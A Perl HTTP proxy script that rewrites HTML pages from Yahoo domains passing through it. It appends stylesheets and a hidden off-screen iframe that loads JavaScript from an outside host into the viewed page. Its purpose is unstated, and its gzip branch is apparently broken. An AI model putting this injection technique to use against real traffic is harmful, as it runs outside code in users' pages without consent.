#!/usr/local/bin/perl

use HTTP::Proxy qw(:log);
use HTTP::Proxy::BodyFilter::simple;
use HTTP::Proxy::BodyFilter::complete;
use HTTP::Proxy::HeaderFilter::simple;
use Compress::Zlib;
use Data::Dumper;
use URI;

my $contentEncoding;
my $hostname = 'ps48174.dreamhostps.com:8081';

my $INSERT = <<END;
<script>
(function(d) {
    var iframe = d.body.appendChild(d.createElement('iframe')), doc = iframe.contentWindow.document;
        iframe.src = 'about:blank';
        iframe.style.cssText = "position:absolute;width:1px;height:1px;left:-9999px;";
    doc.open().write('<body onload="YUI_config={filter:\\'\\',win:window.parent,doc:window.parent.document};var d=document;d.getElementsByTagName(\\'head\\')[0].appendChild(d.createElement(\\'script\\')).src=\\'http://ps48174.dreamhostps.com:8081/together\\';"><script src="http://yui.yahooapis.com/combo?3.3.0/build/yui/yui-min.js&3.3.0/build/loader/loader-min.js"><\\/script><\\/body>');
    doc.close();
})(document);
</script>
END

my @css_files = qw(growl dialog button);
my $css;
foreach my $css_file (@css_files) {
    $css .= '<link rel="stylesheet" href="http://' . $hostname . '/' . $css_file . '.css" type="text/css" />';
}

my $gzip        = Compress::Zlib::memGzip($INSERT);
my $gzip_css    = Compress::Zlib::memGzip($css);
# init
my $proxy = HTTP::Proxy->new( port => 8080, host => '', max_clients => 100 );
$proxy->push_filter(
#    mime     => 'text/html',
#    request => HTTP::Proxy::BodyFilter::simple->new(
#        sub {
#            my ( $self, $dataref, $message, $protocol, $buffer ) = @_;
#            print "REQUEST page is: " . $message->uri . "\n";
#        }
#    ),
    response => HTTP::Proxy::BodyFilter::complete->new,
    response => HTTP::Proxy::BodyFilter::simple->new(
        sub {
            my ( $self, $dataref, $message, $protocol, $buffer ) = @_;
            my $request = $self->proxy()->request;
            my $response = $message;
            $uri = URI->new($request->uri);
            my $req_host = $uri->host;
#            return if ($request->uri =~ /toolbar\.yahoo\.com/);
            return if ($req_host eq 'toolbar.yahoo.com');
#            return unless ($request->uri =~ m#^http://[^.]+\.yahoo\.(com|net)/#);
            return unless ($req_host =~ m#yahoo\.(com|net)$#);
            return if ($req_host eq $hostname);
            return unless ($response);
            my $ct = $response->header('content-type');
            print "CT: $ct\n";
            print "No data\n" unless ($$dataref);;
            print "status: " . $message->code. "\n";
            print "RESPONSE page  is: " . $message->request->uri . "\n";
            if ($ct =~ m#text/html#i && $$dataref) {
                    print "Insert something!\n";
                if ($contentEncoding eq 'gzip') {
                        print "Insert gzip!\n";
                    $dest = Compress::Zlib::memGunzip($$dataref) or die "Cannot uncompress: $gzerrno\n";
                    $$dataref =~ s#</head>#$css</head>#i;
                    my $rest = $$dataref =~ s#</body>#$INSERT</body>#i;
                    if (!$rest) {
#                       $$dataref = $dest . $INSERT;
                    }
                    $$dataref = Compress::Zlib::memGzip($$dataref) or die "Cannot uncompress: $gzerrno\n";
                } else {
                        print "Insert plain!\n";
                    $$dataref =~ s#</head>#$css</head>#i;
#                    my $rest = $$dataref =~ s#</body>#$INSERT</body>#i;
#                    if (!$rest) {
#                        $rest = $$dataref =~ s#<body(.*?)>#<body$1>$INSERT#i;
#                        if (!$rest) {
                            $$dataref .= $INSERT;
#                        }
#                    }
#                        $$dataref .= $INSERT;
#                    if (!$rest) {
#                        print "insert as not inserted!\n";
#                        print $$dataref . "\n";
#                        $$dataref .= $INSERT;
#                    }
                    #${ $_[1] } =~ s#$#$INSERT#i;
                }
            }
        }
    )
);

my $filter = HTTP::Proxy::HeaderFilter::simple->new(
    sub {
            if ($_[1]->header('content-type') =~ m#text/html#i &&  $_[1]->header('content-encoding') =~ /gzip/) {
                $_[1]->header('content-length', $_[1]->header('content-length') + length($gzip) + length($gzip_css));
                $contentEncoding = 'gzip';
            } else {
                $contentEncoding = '';
            }
    }
);
$proxy->push_filter( response => $filter );

print "Ready to rumble on " . $proxy->host . ':' . $proxy->port . "\n";
$proxy->start;
